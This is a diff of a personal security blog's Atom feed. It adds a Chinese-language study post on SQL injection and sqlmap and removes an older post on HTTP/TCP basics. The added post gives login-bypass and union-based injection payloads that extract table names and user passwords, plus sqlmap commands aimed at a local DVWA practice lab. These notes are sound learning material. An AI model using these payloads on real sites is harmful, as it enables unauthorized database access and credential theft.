@@ -6,7 +6,7 @@
   <link href="https://zhangkaibin0921.github.io/atom.xml" rel="self"/>
   
   <link href="https://zhangkaibin0921.github.io/"/>
-  <updated>2022-03-09T06:27:37.665Z</updated>
+  <updated>2022-03-17T14:49:41.977Z</updated>
   <id>https://zhangkaibin0921.github.io/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>sql注入和sqlmap的使用</title>
+    <link href="https://zhangkaibin0921.github.io/2022/03/17/sql%E6%B3%A8%E5%85%A5/"/>
+    <id>https://zhangkaibin0921.github.io/2022/03/17/sql%E6%B3%A8%E5%85%A5/</id>
+    <published>2022-03-17T14:25:01.000Z</published>
+    <updated>2022-03-17T14:49:41.977Z</updated>
+    
+    <content type="html"><![CDATA[<blockquote><p>还是有点乱，有时间会把弄好的</p></blockquote><p>常见的SQL注入有数字型注入、Union注入、字符型注入、布尔盲注、时间注入、报错注入和堆叠注入</p><p>浏览器会自动将URI中的特殊字符进行URL编码，服务器收到请求后会自动进行URL解码</p><h2 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h2><p><code>SELECT username, password FROM users WHERE username=&#39;&#39; or 1=1 -- AND password=&#39;anything</code><br>用户的输入用户名为<code>&#39; or 1=1 --</code>，密码为任意值即可</p><h2 id="information-schema数据库"><a href="#information-schema数据库" class="headerlink" title="information_schema数据库"></a>information_schema数据库</h2><p><img src="/picture/web19.png"></p><p>1、查看数据库名<br><code>select schema_name from information_schema.schemata;</code></p><p>2、查看表名<br><code>select table_name from information_schema.tables where table_schema=&#39;security&#39;;</code><br>这个security是上一步查出来的数据库名称</p><p>3、查看列名<br><code>select column_name from information_schema.columns where table_name=&#39;users&#39; and table_schema=&#39;security&#39;;</code><br>users是上一步查出来的表名</p><p>4、查数据<br><code>select username,password from security.users;</code><br>username和password是一步查出来的列名</p><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><p>1、<code>?id=1&#39;</code>  加单引号输出错误<br>2、<code>?id=1 and 1=1</code> 输出正常<br>3、<code>?id=1 and 1=2</code> 输出错误<br>则存在数字型注入漏洞(或直接通过id=3-1和id=2的回显页面一致，判断这里存在数字型注入)</p><p>4、然后通过联合查询，查询到本数据库的其他所有表名<br><code>?id=-1 union select 1,group_concat(table_name) from information_schema,tables where table_schema=database()</code><br>table_name字段是information_schema库中tables表的表名字段，表中还有数据库名字段table_schema。database()函数返回的内容是当前数据库的名称。group_contact是用<code>，</code>联合多行记录的函数，也就是说该语句可以联合查询当前库的所有（事实上有一定长度限制）表名并显示在一个字段中。</p><p>5、通过columns表及其中的column_name查询出的内容即为wp_user（上一步查询出的一个表名）中的字段名<br><code>?id=-1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;wp_user&#39;</code></p><h2 id="字符型注入流程"><a href="#字符型注入流程" class="headerlink" title="字符型注入流程"></a>字符型注入流程</h2><p>1、判断是否存在注入点<br>先输入一个单引号，看页面是否错误输出，如果错误输出，继续进行下一步(或者 id=3-1观察页面是否为空再<br>id=2a观察页面是否有结果，如果有，那么多半就是字符型)</p><p>SELECT  first_name,last_name  FROM users WHERE  user_id=’<font color='red'>1’ and 1=1#</font>‘<br>用户输入的数据为<font color=red>1’ and 1=1#</font></p><p>SELECT  first_name,last_name  FROM users WHERE  user_id=’<font color='red'>1’ and 1=2#</font>‘<br>用户输入的数据为<font color=red>1’ and 1=2#</font></p><p>两次尝试后1=1正常输出，1=2错误输出，证明SQL语句生效，存在SQL注入漏洞</p><p>尝试使用单引号来闭合前面的单引号，再用<code>--%20</code>或<code>%23</code>注释后面的语句。这里一定要用<strong>url编码，空格的编码是%20,   #的编码是%23<br>id=2%27%23</strong><br><code>where id=&#39;1&#39;#&#39; </code>  此时的MySQL语句</p><p>2、判断数据库列数  order by [column_num]</p><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 1 #</font>‘<br>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 2 #</font>‘<br>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  order by 3 #</font>‘ </p><p>当表中只有两列，order by 3就会出错</p><p>3、联合查询其他信息  union select [sql1] [sql2]</p><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union  select  user(),database()#</font>‘<br>用户输入的SQL语句，执行了MYSQL内置函数user()和database(),user()返回当前数据库连接用户，database()返回当前数据库名称</p><p>4、联合查询表  union select  table_name,table_schema  from  information_schema.tables  where table_schema= ‘[database_name]’</p><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union select table_name,table_schema  from  information_schema.tables  where  table_schema=’dvwa’#</font>‘<br>从information_schema数据库中查询dvwa数据库表<br>这一步是为了查询数据库中有哪些表，因为上一步查到了数据库的名称,这个dvwa就是上一步查询到的数据库的名称。我们想要看看这个数据库里面有什么东西，除了数据库名称根据实际进行更改，其他内容是固定不变的。</p><p>5、联合查询信息  union [query_sql]</p><p>SELECT first_name,last_name  FROM users WHERE  user_id=’<font color=red>1’  union  select user,password  from  users#</font>‘<br>上一步查询到数据库中有哪些表，现在想要查看表中的内容。假设这里的users就是上一步中查到的表，猜测可能会有user和password这两个属性，查询user和password的值</p><h2 id="关于Union联合注入的问题"><a href="#关于Union联合注入的问题" class="headerlink" title="关于Union联合注入的问题"></a>关于Union联合注入的问题</h2><p><code>? id=1 union select user,pwd from wp_user;</code><br>可能MySQL确实查询出了两行记录，但是PHP代码决定了页面只显示一行代码</p><p>可以在原有数据后面加上<code>limit 1,1</code> （是一个条件限制，作用是取查询结果第一条记录后的一条记录）<br><code>? id=1 union select user,pwd from wp_user limit 1,1;</code> </p><p>也可以指定id=-1或者一个很大的值，使得第一行记录无法被查到，这样结果就只有UNION的查询结果了</p><h2 id="sqlmap的使用"><a href="#sqlmap的使用" class="headerlink" title="sqlmap的使用"></a>sqlmap的使用</h2><p>1、检测漏洞<br>python sqlmap.py -u “<a href="http://127.0.0.1/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;">http://127.0.0.1/vulnerabilities/sqli/?id=2&amp;Submit=Submit#&quot;</a><br>大部分情况下的网站是可以直接这样的<br>但是dvwa需要登录，所以需要添加cookie信息</p><p>cookie信息怎么看：</p><img class="url&#x3D;&#x2F;picture&#x2F;web1.png"><p>python sqlmap.py -u “<a href="http://127.0.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;">http://127.0.0.1/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot;</a> –cookie =”security=low; PHPSESSID=13nt494nnep4ge910t9d0tq91o”</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;blockquote&gt;
+&lt;p&gt;还是有点乱，有时间会把弄好的&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;p&gt;常见的SQL注入有数字型注入、Union注入、字符型注入、布尔盲注、时间注入、报错注入和堆叠注入&lt;/p&gt;
+&lt;p&gt;浏览器会自动将URI中的特殊字符进行URL编码，服务器收到请求后</summary>
+      
+    
+    
+    
+    
+    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
+    
+  </entry>
   
   <entry>
     <title>buu-MISC第一页</title>
@@ -451,28 +477,6 @@
     
     
     <category term="Crypto" scheme="https://zhangkaibin0921.github.io/tags/Crypto/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>http请求和响应、TCP网络五层架构等基础知识</title>
-    <link href="https://zhangkaibin0921.github.io/2022/01/14/http%E8%AF%B7%E6%B1%82%E5%92%8C%E5%93%8D%E5%BA%94/"/>
-    <id>https://zhangkaibin0921.github.io/2022/01/14/http%E8%AF%B7%E6%B1%82%E5%92%8C%E5%93%8D%E5%BA%94/</id>
-    <published>2022-01-14T01:23:09.000Z</published>
-    <updated>2022-02-10T05:18:49.438Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="HTTP基础知识"><a href="#HTTP基础知识" class="headerlink" title="HTTP基础知识"></a>HTTP基础知识</h2><p>http协议的特点:<br>基于tcp/ip协议<br>默认端口号为80<br>请求与响应一一对应<br>每次请求相互独立，是无状态协议(这也是为什么需要cookie)</p><p>HTTP常用有八种请求方式，常用get和post<br>get请求：请求参数在url地址中，url有长度限制；<font color=red>get方式只能传输字符型的数据</font><br>post请求：请求参数在请求体中，无大小限制；<font color=red>post方式能传输字符和字节型数据</font>(当你想要上传一张图片或音乐必须使用post方式)</p><p>GET产生一个数据包，POST产生两个数据包。对于GET请求，浏览器会把http header和data一并发出去，服务器相应200（返回数据）。而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok。</p><p><img src="/picture/web15.png"></p><p>响应状态码：服务器告诉浏览器本次请求和响应的状态<br>1×× ：服务器接收浏览器消息未完成，发送1××状态码<br>2×× ：成功，200<br>3×× ：重定向，302，,304<br>4×× ：客户端错误，404(没有找到对应资源)，405(请求方法不被允许)<br>5×× ：服务器错误，500(服务器内部出现异常)</p><p><img src="/picture/web11.png"></p><p><img src="/picture/web12.png"><br>X-Forwarded-For:简称XFF头，它代表客户端，也就是HTTP的请求端真实的IP，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。xff 是http的拓展头部，作用是使Web服务器获取访问用户的IP真实地址（可伪造）。由于很多用户通过代理服务器进行访问，服务器只能获取代理服务器的IP地址，而xff的作用在于记录用户的真实IP，以及代理服务器的IP。格式为：X-Forwarded-For: 本机IP, 代理1IP, 代理2IP, 代理2IP</p><p>HTTP Referer是header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的，服务器基此可以获得一些信息用于处理。referer 是http的拓展头部，作用是记录当前请求页面的来源页面的地址。服务器使用referer确认访问来源，如果referer内容不符合要求，服务器可以拦截或者重定向请求。</p><p><img src="/picture/web13.png"></p><p><img src="/picture/web14.png"></p><h2 id="TCP网络五层架构"><a href="#TCP网络五层架构" class="headerlink" title="TCP网络五层架构"></a>TCP网络五层架构</h2><p><img src="/picture/web2.png"><br>分层好处：<br>1、各层独立：限制了依赖关系的范围，各层之间使用标准化的接口，各层不需要知道上下层是如何工作的，增加或者修改一个应用层协议不会影响传输层协议<br>2、灵活性更好：比如路由器不需要应用层和传输层，分层后路由器就可以只用加载更少的几个协议层<br>3、易于测试和维护：提高了可测试性，可以独立的测试特定层，某一层有了更好的实现可以整体替换掉<br>4、能促进标准化：每一层之策清楚，方便标准化</p><h2 id="网络相关协议基础知识"><a href="#网络相关协议基础知识" class="headerlink" title="网络相关协议基础知识"></a>网络相关协议基础知识</h2><p>1、TCP/IP是互联网相关的各类协议族的总称：IEEE 802.3、TCP、UDP、HTTP、DNS、FTP、IP、FDDI、ICMP、SNMP、PPPoE</p><p>2、FTP(文件传输协议)、DNS(域名系统)、HTTP位于应用层</p><p>3、在传输层有两个不同性质的协议:TCP(传输控制协议)和UDP(用户数据报协议)</p><p>4、IP网际协议位于网络层，几乎所有使用网络的系统都会用到IP协议。可能有人会把“IP”和“IP地址”弄混，“IP”其实是一种协议的名称。IP协议的作用是把各种数据包传送给对方。而要确保确实送达到对方那里，则需要满足各类条件，其中两个重要的条件是IP地址和MAC地址。</p><p>IP地址是指明了节点被分配到的地址，MAC地址是指网卡所属的固定地址。IP地址可以和MAC地址进行配对。IP地址可变换，MAC地址基本上不会更改。（一般电脑厂商可根据今年印了多少MAC地址，判断今年生产了多少台电脑）。</p><p>IP地址间的通信依赖MAC地址。在网络上，通信双方在同一局域网(LAN)下情况很少，通常是经过多台计算机和网络设备中转才能连接到对方。而在进行中转时，会利用下一站中转设备的MAC地址来搜索下一个中转目标。这时会采用ARP协议。ARP协议是一种用于解析地址的协议，根据通信方的IP地址就可以查出对应的MAC地址</p><p><img src="/picture/http1.jpg"></p><p>5、TCP位于传输层，提供可靠的字节流服务。字节流服务是指为了方便传输，将大块数据分割成以报文段为单位的数据包进行管理。TCP为了更容易传送大数据才把数据分割，而且<font color=red>TCP协议能够确认数据最终是否送达对方</font></p><p>为了准确无误的将数据送达目标处，TCP协议采用了<font color=red>三次握手策略</font>。用TCP协议把数据包发送出去后，TCP不会对传送后的情况置之不理，他一定会向对方确认是否成功送达。握手过程使用了TCP的标志——SYN(synchronize)和ACK(acknowledgement)。发送端首先发送一个带SYN标志的数据包给对方，接收端接收 后，回传一个带有SYN/ACK标志的数据包以表示传达确认信息。最后，发送端再回传一次带有ACK标志的数据包，代表“握手”结束</p><p>若握手过程中某个阶段莫名中断，TCP协议会再次以相同的顺序发送相同的数据包。</p><p><img src="/picture/http2.jpg"></p><p>6、DNS位于应用层，它提供域名到IP地址之间的解析服务。计算机既可以被赋予IP地址也可以被赋予主机名和域名。比如：<a href="http://www.hackr.jp/">www.hackr.jp</a></p><p>用户通常使用主机名或域名来访问对方的计算机，而不是直接通过IP地址访问。因为与IP地址的一组纯数字相比，用字母配合数字的表示形式更符合人类记忆习惯。但计算机更擅长处理一长串数字，所以DNS协议就是提供了通过域名查询IP地址，或逆向从IP地址反查域名的协议</p><p><img src="/picture/http3.jpg"></p><p>7、整个流程如图</p><p><img src="/picture/http4.jpg"></p><blockquote><p>我是跟着《图解HTTP》和<a href="https://www.bilibili.com/video/BV1TR4y1x7zg?spm_id_from=333.999.0.0">这个视频(这是个超链接)</a>学习的这部分知识，我觉得我记录的每个知识点都是比较重要的知识点</p></blockquote>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h2 id=&quot;HTTP基础知识&quot;&gt;&lt;a href=&quot;#HTTP基础知识&quot; class=&quot;headerlink&quot; title=&quot;HTTP基础知识&quot;&gt;&lt;/a&gt;HTTP基础知识&lt;/h2&gt;&lt;p&gt;http协议的特点:&lt;br&gt;基于tcp/ip协议&lt;br&gt;默认端口号为80&lt;br&gt;请求与响应一</summary>
-      
-    
-    
-    
-    
-    <category term="web" scheme="https://zhangkaibin0921.github.io/tags/web/"/>
     
   </entry>
   
